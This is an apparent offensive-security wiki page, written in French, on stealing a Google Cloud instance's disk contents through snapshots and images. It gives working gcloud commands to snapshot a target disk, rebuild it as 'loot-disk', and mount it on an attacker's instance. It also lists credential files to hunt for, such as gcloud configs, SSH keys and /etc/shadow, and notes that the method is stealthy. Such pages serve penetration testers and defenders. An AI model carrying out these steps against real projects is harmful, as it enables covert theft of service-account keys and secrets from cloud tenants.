---
title: "Instantanés de disque : récupérer un disque via des instantanés et des images"
description: "Créer et lire des instantanés ou des images de disque persistant pour récupérer le contenu et les secrets du disque d'une autre instance."
keywords:
  - instantané de disque
  - disque persistant
  - image
  - récupération de données
  - compute.disks
---

# Instantanés de disque

Un disque persistant peut être copié dans un **instantané** ou une **image**, et quiconque détient `compute.disks.createSnapshot` (ou peut lire un instantané ou une image existante) peut reconstruire le disque sur une instance qu'il contrôle. Cela expose l'ensemble du système de fichiers de l'instance source, y compris les clés de compte de service, les clés SSH et les secrets d'application, sans jamais s'y connecter.

## Prendre un instantané et lire le disque d'une cible

```bash
# snapshot a disk you can read, then create a new disk from the snapshot
gcloud compute disks snapshot <target-disk> --zone <zone> --snapshot-names loot-snap
gcloud compute disks create loot-disk --source-snapshot loot-snap --zone <zone>

# attach the new disk to your own instance and mount it
gcloud compute instances attach-disk <your-instance> --disk loot-disk --zone <zone>
# on the instance
sudo mkdir /mnt/loot && sudo mount /dev/sdb1 /mnt/loot
```

## Images et partage inter-projets

```bash
# an image built from a disk can be shared or made public by mistake
gcloud compute images list --filter="NOT family~'debian|ubuntu|cos'"
gcloud compute images describe <image> --format='value(sourceDisk)'
# create a disk from a readable image and mount as above
gcloud compute disks create loot-disk --image <image> --zone <zone>
```

## Notes d'exploitation

- Montez en lecture seule et recherchez d'abord `/root/.config/gcloud`, `/home/*/.ssh`, `/etc/shadow`, et les configurations d'application contenant des secrets intégrés.
- Un instantané ou une image partagé entre projets (ou avec `allAuthenticatedUsers`) est accessible depuis un projet attaquant, donc énumérez les images et instantanés que vous ne possédez pas.
- Prendre un instantané est plus discret que de toucher à l'instance en direct, et laisse la source fonctionner sans y toucher.

## Outils

- **gcloud compute** (`disks snapshot`, `disks create --source-snapshot`, `instances attach-disk`) : le chemin de restauration complet.
- **gsutil** : récupérer une image exportée depuis le bucket où elle atterrit.

## Références

- [HackTricks Cloud: GCP compute disks](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html)
- [Google: creating and managing disk snapshots](https://cloud.google.com/compute/docs/disks/create-snapshots)
- [Hacking the Cloud: GCP](https://hackingthe.cloud/)
